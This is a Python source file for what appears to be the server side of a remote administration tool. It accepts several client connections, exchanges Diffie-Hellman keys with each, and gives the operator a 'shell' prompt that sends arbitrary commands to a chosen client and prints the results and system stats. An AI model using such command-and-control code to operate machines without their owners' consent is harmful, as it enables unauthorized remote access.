from rsat import Tool
import threading
import termcolor
from rich.console import Console
from rich.table import Table
from rich.live import Live
import time
import socket
from DFH import Dfh_server as Dfh
#variables 
clients = {}
keys = []
lock = threading.Lock()  
listen_clients = 5
server_id = 0
curr_sys = ""
active_stats = []
def color(text, col):
    return termcolor.colored(text, col)

#TODO Learn Threads_lock
def handle_clients():
    global clients
    while True:
        conn, addr = s.accept()
        key_gen = conn.recv(1024).decode().split("-")
        a, mod = int(key_gen[0]), int(key_gen[1])
        client_secret = int(key_gen[2])
        server_df = Dfh(a, mod)
        secret = server_df.private_expo()
        key = server_df.genrate_secret(client_secret)
        conn.send(str(secret).encode())
        # conn.recv(1024)

        with lock:
            clients[addr] = conn
            keys.append(str(key).encode()[:16])
            print(color(f"Connected to {addr}", "green"), "secret=",str(key).encode()[:16])

def show_stats(cpu_percent, V_ram, dsk_usage, duration=5):
    console = Console()
    start_time = time.time()

    def create_table(cpu, memory, disk):
        table = Table(title="System Stats")
        table.add_column("Metric", justify="left", style="cyan", no_wrap=True)
        table.add_column("Value", justify="right", style="magenta")
        table.add_row("CPU Usage", f"{cpu}%")
        table.add_row("Memory Usage", f"{memory}%")
        table.add_row("Disk Usage", f"{disk}%")
        return table

    with Live(console=console, refresh_per_second=1) as live:
        while time.time() - start_time < duration:
            live.update(create_table(cpu_percent, V_ram, dsk_usage))
            time.sleep(1)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = "localhost"
PORT = 6969
s.bind((HOST, PORT))
s.listen(listen_clients)
print(termcolor.colored("Server started and listening...", "green"))
def check_client(key, client_socket):
    try:
        s = Tool(key, client_socket)
        s.send("..SYN..")
        s.recv()
        return True  
    except socket.error:
        return False 
threading.Thread(target=handle_clients, daemon=True).start()

while True:
    if clients:
        try:
            addr, conn = list(clients.items())[server_id]
            key = keys[server_id]
            server = Tool(key, conn)
        except (ValueError, IndexError) as e:
            print(termcolor.colored(f"Some Error Happened: {e}", "red"))
            server_id = 0
            continue

        prompt = input(f"[{color("*", "blue")}] {color("shell", "green")}~{addr} ")


        if prompt.lower().startswith("switch"):
            try:
                server_id = int(prompt.split()[1]) - 1
            except:
                server_id = 0
                continue

        elif prompt.lower() == "active":
            for i, (addr, conn) in enumerate(clients.items()):
                key = keys[i]
            with lock:
                print(color("Connected clients:", "cyan"))
                for i, (addr, conn) in enumerate(clients.items(), 1):
                    print(f"[{i}] {color(addr, "blue")}" + f" Active {color("*", "green")}" if check_client(key[i], conn) else f" unActive {color("*", "red")}")
        else:
            try:
                server.send(prompt)
                from_client = server.recv()
                if from_client.startswith("####CPUM#### "):
                    stats = from_client.split("####CPUM#### ")[1].split("-")
                    show_stats(stats[0], stats[1], stats[2])
                else:
                    print(from_client)
            except:
                print(color("The Client may be offline.... ", "red"))
                continue